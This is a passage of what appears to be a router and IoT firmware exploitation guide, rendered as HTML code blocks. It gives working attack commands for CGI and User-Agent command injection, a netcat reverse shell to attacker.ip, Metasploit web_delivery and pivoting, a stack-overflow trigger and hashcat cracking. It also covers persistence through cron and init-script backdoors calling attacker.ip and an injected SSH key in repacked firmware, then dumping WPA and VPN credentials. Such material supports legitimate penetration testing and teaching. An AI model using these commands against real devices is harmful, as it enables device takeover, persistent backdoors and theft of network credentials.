style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// Bypass: If username != &quot;admin&quot;, authentication check is skipped</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// Exploit: Use any username except &quot;admin&quot; (no password needed)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="command-injection">Command Injection<a href="#command-injection" class="hash-link" aria-label="Direct link to Command Injection" title="Direct link to Command Injection" translate="no">​</a></h3>
<p><strong>CGI parameter injection:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Vulnerable CGI script (/cgi-bin/ping.cgi):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">#!/bin/sh</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token assign-left variable" style="color:#36acaa">IP</span><span class="token operator" style="color:#393A34">=</span><span class="token variable" style="color:#36acaa">$QUERY_STRING</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">ping</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-c</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$IP</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> /tmp/ping.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> /tmp/ping.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Exploitation:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">curl</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;http://router.ip/cgi-bin/ping.cgi?8.8.8.8;id&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Executed command: ping -c 1 8.8.8.8;id</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Output: uid=0(root) gid=0(root) groups=0(root)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Reverse shell:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">curl</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;http://router.ip/cgi-bin/ping.cgi?8.8.8.8;nc%20-e%20/bin/sh%20attacker.ip%201234&quot;</span><br></span></code></pre></div></div>
<p><strong>HTTP header injection:</strong></p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">// Vulnerable code:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">handle_user_agent</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">user_agent</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> cmd</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">512</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">sprintf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">cmd</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;echo %s &gt;&gt; /tmp/log&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> user_agent</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">system</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">cmd</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// Exploitation (User-Agent header):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">User</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Agent</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> test</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> cat </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">etc</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">shadow </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">tmp</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">shadow</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">txt</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="buffer-overflows">Buffer Overflows<a href="#buffer-overflows" class="hash-link" aria-label="Direct link to Buffer Overflows" title="Direct link to Buffer Overflows" translate="no">​</a></h3>
<p><strong>Stack-based overflow:</strong></p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">// Vulnerable code (httpd):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">process_url</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">url</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> buffer</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">256</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">strcpy</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buffer</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> url</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">// No bounds checking</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">// ...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// Exploitation (send long URL):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property expression" style="color:#36acaa">Python exploit</span><span class="token macro property expression operator" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> b</span><span class="token string" style="color:#e3116c">&quot;A&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">300</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">get</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">f</span><span class="token string" style="color:#e3116c">&quot;http://router.ip/{payload}&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property expression" style="color:#36acaa">Result</span><span class="token macro property expression operator" style="color:#393A34">:</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression function" style="color:#d73a49">Crash</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">or RCE with proper exploit</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="insecure-firmware-updates">Insecure Firmware Updates<a href="#insecure-firmware-updates" class="hash-link" aria-label="Direct link to Insecure Firmware Updates" title="Direct link to Insecure Firmware Updates" translate="no">​</a></h3>
<p><strong>Unsigned firmware updates:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Firmware update without signature verification</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Attacker can upload malicious firmware</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Exploitation:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 1. Modify legitimate firmware (inject backdoor)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 2. Upload modified firmware via web interface</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 3. Device installs malicious firmware</span><br></span></code></pre></div></div>
<p><strong>Firmware downgrade attacks:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># If device allows downgrade to older, vulnerable firmware:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 1. Upload old firmware with known vulnerabilities</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 2. Exploit old vulnerabilities</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="weak-cryptography">Weak Cryptography<a href="#weak-cryptography" class="hash-link" aria-label="Direct link to Weak Cryptography" title="Direct link to Weak Cryptography" translate="no">​</a></h3>
<p><strong>Hardcoded encryption keys:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Found in binary or config:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">AES_KEY </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;1234567890ABCDEF1234567890ABCDEF&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Use key to decrypt firmware or communications</span><br></span></code></pre></div></div>
<p><strong>Weak password hashing:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># MD5 hashed passwords (etc/shadow):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">admin:21232f297a57a5a743894a0e4a801fc3:0:0::/root:/bin/sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Crack with hashcat:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hashcat </span><span class="token parameter variable" style="color:#36acaa">-m</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> hash.txt rockyou.txt</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="exploitation-techniques">Exploitation Techniques<a href="#exploitation-techniques" class="hash-link" aria-label="Direct link to Exploitation Techniques" title="Direct link to Exploitation Techniques" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="gaining-shell-access">Gaining Shell Access<a href="#gaining-shell-access" class="hash-link" aria-label="Direct link to Gaining Shell Access" title="Direct link to Gaining Shell Access" translate="no">​</a></h3>
<p><strong>Method 1: Command injection</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Find injectable parameter (ping, traceroute, etc.)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Inject reverse shell:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">nc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-e</span><span class="token plain"> /bin/sh attacker.ip </span><span class="token number" style="color:#36acaa">1234</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Or use Metasploit web_delivery:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfconsole</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use exploit/multi/script/web_delivery</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">set</span><span class="token plain"> target </span><span class="token number" style="color:#36acaa">7</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic"># Python</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">set</span><span class="token plain"> payload linux/mipsle/shell_reverse_tcp  </span><span class="token comment" style="color:#999988;font-style:italic"># Adjust for architecture</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">set</span><span class="token plain"> lhost attacker.ip</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Inject generated command via vulnerable CGI parameter</span><br></span></code></pre></div></div>
<p><strong>Method 2: Telnet/SSH with extracted credentials</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Found in etc/passwd:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># root:x:0:0::/root:/bin/sh</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Found in etc/shadow:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># root:$1$xyz...:0:0::/root:/bin/sh</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Crack hash or use default password</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Login via telnet:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">telnet router.ip</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># root / &amp;lt;password&amp;gt;</span><br></span></code></pre></div></div>
<p><strong>Method 3: UART shell</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Connect to UART (see Hardware Interfaces section)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Interrupt boot, modify bootargs to spawn shell:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">setenv bootargs </span><span class="token string" style="color:#e3116c">&quot;init=/bin/sh&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">boot</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="persistence-mechanisms">Persistence Mechanisms<a href="#persistence-mechanisms" class="hash-link" aria-label="Direct link to Persistence Mechanisms" title="Direct link to Persistence Mechanisms" translate="no">​</a></h3>
<p><strong>Method 1: Modified firmware</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Extract firmware, add backdoor, repack, upload</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Example: Add SSH authorized_key</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;ssh-rsa AAAA... attacker@host&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;&gt;</span><span class="token plain"> squashfs-root/etc/dropbear/authorized_keys</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Repack squashfs:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mksquashfs squashfs-root/ filesystem_modified.squashfs </span><span class="token parameter variable" style="color:#36acaa">-comp</span><span class="token plain"> xz</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Rebuild firmware image:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># (depends on firmware format - TRX, BIN, etc.)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Upload modified firmware via web interface or TFTP</span><br></span></code></pre></div></div>
<p><strong>Method 2: Cron job</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Add cron job (if device supports cron):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;*/5 * * * * nc attacker.ip 1234 -e /bin/sh&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;&gt;</span><span class="token plain"> /etc/crontabs/root</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Make persistent (if filesystem is writable):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Mount root filesystem as RW, modify, sync</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">mount</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> remount,rw /</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;*/5 * * * * nc attacker.ip 1234 -e /bin/sh&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;&gt;</span><span class="token plain"> /etc/crontabs/root</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sync</span><br></span></code></pre></div></div>
<p><strong>Method 3: Init script</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Add backdoor to init script:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;nc attacker.ip 1234 -e /bin/sh &amp;&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;&gt;</span><span class="token plain"> /etc/init.d/rcS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Make persistent:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">mount</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> remount,rw /</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sync</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="post-exploitation">Post-Exploitation<a href="#post-exploitation" class="hash-link" aria-label="Direct link to Post-Exploitation" title="Direct link to Post-Exploitation" translate="no">​</a></h3>
<p><strong>Network pivoting:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Use compromised router as pivot point:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Route traffic through router to access internal network</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Setup SOCKS proxy (if device has netcat/socat):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-D</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">8080</span><span class="token plain"> root@router.ip</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Or use Metasploit pivot:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfconsole</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use post/multi/manage/autoroute</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">set</span><span class="token plain"> session </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre></div></div>
<p><strong>Extracting sensitive data:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Wireless credentials:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> /etc/config/wireless</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Contains WPA/WPA2 passwords</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># VPN credentials:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" 